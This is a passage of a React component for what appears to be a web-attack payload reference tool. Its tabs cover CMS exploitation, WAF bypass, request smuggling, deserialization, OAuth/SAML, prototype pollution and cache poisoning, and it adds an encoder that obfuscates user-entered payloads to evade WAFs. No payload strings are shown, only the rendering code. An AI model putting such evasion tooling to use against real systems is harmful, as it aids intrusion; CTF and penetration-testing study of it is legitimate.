            <Globe className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">CMS Detection & Exploitation</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(cmsPayloads).length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(cmsPayloads).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* API Discovery */}
        {activeTab === 'api' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Server className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">API Discovery</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(apiDiscoveryPayloads).length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(apiDiscoveryPayloads).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* WAF Bypass */}
        {activeTab === 'waf' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Shield className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">WAF Bypass Techniques</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(wafBypassPayloads).length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(wafBypassPayloads).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* Polyglot Payloads */}
        {activeTab === 'polyglot' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Zap className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">Polyglot Payloads</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(polyglotPayloads).length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(polyglotPayloads).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* Interactive Encoding & Obfuscation Tools */}
        {activeTab === 'encoding' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Code className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">Interactive Encoding & Obfuscation Tools</h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* Input Section */}
            <Card className="p-4 space-y-4">
              <h3 className="font-semibold">Input</h3>
              <textarea
                className="w-full h-32 p-3 bg-background border border-border rounded resize-none font-mono text-sm"
                placeholder="Enter your payload here..."
                value={customPayload}
                onChange={(e) => setCustomPayload(e.target.value)}
              />
              
              <div className="flex items-center gap-2">
                <label className="text-sm font-medium">Obfuscation Level:</label>
                <select
                  value={obfuscationLevel}
                  onChange={(e) => setObfuscationLevel(e.target.value as 'low' | 'medium' | 'high')}
                  className="px-2 py-1 bg-background border border-border rounded text-sm"
                >
                  <option value="low">Low</option>
                  <option value="medium">Medium</option>
                  <option value="high">High</option>
                </select>
              </div>
            </Card>

            {/* Output Section */}
            <Card className="p-4 space-y-4">
              <h3 className="font-semibold">Encoded Output</h3>
              <div className="space-y-3">
                {/* WAF Bypass */}
                <div>
                  <div className="flex items-center justify-between mb-1">
                    <label className="text-sm font-medium">WAF Bypass:</label>
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => copyToClipboard(encodingTools.wafBypassEncoder(customPayload, obfuscationLevel))}
                      className="h-6"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                  <div className="bg-background border border-border rounded p-2 font-mono text-xs break-all">
                    {encodingTools.wafBypassEncoder(customPayload, obfuscationLevel)}
                  </div>
                </div>

                {/* Unicode Encoding */}
                <div>
                  <div className="flex items-center justify-between mb-1">
                    <label className="text-sm font-medium">Unicode:</label>
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => copyToClipboard(encodingTools.unicodeEncoder(customPayload))}
                      className="h-6"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                  <div className="bg-background border border-border rounded p-2 font-mono text-xs break-all">
                    {encodingTools.unicodeEncoder(customPayload)}
                  </div>
                </div>

                {/* Double URL Encoding */}
                <div>
                  <div className="flex items-center justify-between mb-1">
                    <label className="text-sm font-medium">Double URL:</label>
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => copyToClipboard(encodingTools.doubleEncoder(customPayload))}
                      className="h-6"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                  <div className="bg-background border border-border rounded p-2 font-mono text-xs break-all">
                    {encodingTools.doubleEncoder(customPayload)}
                  </div>
                </div>

                {/* HTML Entity Encoding */}
                <div>
                  <div className="flex items-center justify-between mb-1">
                    <label className="text-sm font-medium">HTML Entity:</label>
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => copyToClipboard(encodingTools.htmlEntityEncoder(customPayload))}
                      className="h-6"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                  <div className="bg-background border border-border rounded p-2 font-mono text-xs break-all">
                    {encodingTools.htmlEntityEncoder(customPayload)}
                  </div>
                </div>

                {/* Base64 Chunks */}
                <div>
                  <div className="flex items-center justify-between mb-1">
                    <label className="text-sm font-medium">Base64 Chunks:</label>
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => copyToClipboard(encodingTools.base64ChunkEncoder(customPayload))}
                      className="h-6"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                  <div className="bg-background border border-border rounded p-2 font-mono text-xs break-all">
                    {encodingTools.base64ChunkEncoder(customPayload)}
                  </div>
                </div>
              </div>
            </Card>
          </div>

          {/* WAF Bypass Techniques */}
          <Card className="p-4">
            <h3 className="font-semibold mb-4">WAF Bypass Techniques</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {filterPayloads(wafBypassPayloads).map(renderPayloadCard)}
            </div>
          </Card>

          {/* Polyglot Payloads */}
          <Card className="p-4">
            <h3 className="font-semibold mb-4">Polyglot Payloads</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {filterPayloads(polyglotPayloads).map(renderPayloadCard)}
            </div>
          </Card>
          </div>
        )}

        {/* CTF Techniques */}
        {activeTab === 'techniques' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Eye className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">CTF Techniques & Methodologies</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {ctfTechniques.length} techniques
            </span>
          </div>
          <div className="space-y-6">
            {ctfTechniques
              .filter(technique => 
                technique.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                technique.description.toLowerCase().includes(searchTerm.toLowerCase())
              )
              .map((technique, index) => (
                <Card key={index} className="p-6">
                  <div className="space-y-4">
                    <div className="flex items-center justify-between">
                      <h3 className="text-xl font-semibold text-accent">{technique.name}</h3>
                      <span className="px-2 py-1 bg-muted rounded text-sm">{technique.category}</span>
                    </div>
                    <p className="text-muted-foreground">{technique.description}</p>
                    
                    <div>
                      <h4 className="font-semibold mb-2">Methodology:</h4>
                      <ol className="list-decimal list-inside space-y-1 text-sm">
                        {technique.steps.map((step, stepIndex) => (
                          <li key={stepIndex} className="text-muted-foreground">{step}</li>
                        ))}
                      </ol>
                    </div>
                    
                    <div>
                      <h4 className="font-semibold mb-2">Examples:</h4>
                      <div className="space-y-2">
                        {technique.examples.map((example, exampleIndex) => (
                          <div key={exampleIndex} className="bg-background rounded p-2 font-mono text-sm break-all flex items-center justify-between">
                            <span>{example}</span>
                            <Button
                              size="sm"
                              variant="outline"
                              onClick={() => copyToClipboard(example)}
                              className="h-6 ml-2"
                            >
                              <Copy className="h-3 w-3" />
                            </Button>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>
                </Card>
              ))}
          </div>
          </div>
        )}

        {/* Deserialization Attacks */}
        {activeTab === 'deserialization' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <FileJson className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">Deserialization Attack Payloads</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {getCurrentPayloads().length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {getCurrentPayloads().map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* HTTP Request Smuggling */}
        {activeTab === 'smuggling' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <GitBranch className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">HTTP Request Smuggling Payloads</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {getCurrentPayloads().length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {getCurrentPayloads().map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* OAuth & SAML Attacks */}
        {activeTab === 'oauth' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Key className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">OAuth & SAML Attack Payloads</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {getCurrentPayloads().length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {getCurrentPayloads().map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* WebSocket Attacks */}
        {activeTab === 'websocket' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Radio className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">WebSocket Attack Payloads</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {getCurrentPayloads().length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {getCurrentPayloads().map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* Prototype Pollution */}
        {activeTab === 'prototype' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Boxes className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">Prototype Pollution Payloads</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {getCurrentPayloads().length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {getCurrentPayloads().map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* Web Cache Poisoning */}
        {activeTab === 'cache' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Cloud className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">Web Cache Poisoning Payloads</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {getCurrentPayloads().length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {getCurrentPayloads().map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* Race Conditions */}
        {activeTab === 'race' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Zap className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">Race Condition Payloads</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {getCurrentPayloads().length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {getCurrentPayloads().map(renderPayloadCard)}
          </div>
          </div>
        )}
        </div>
      </div>
    </div>
  )
}

export default WebTools
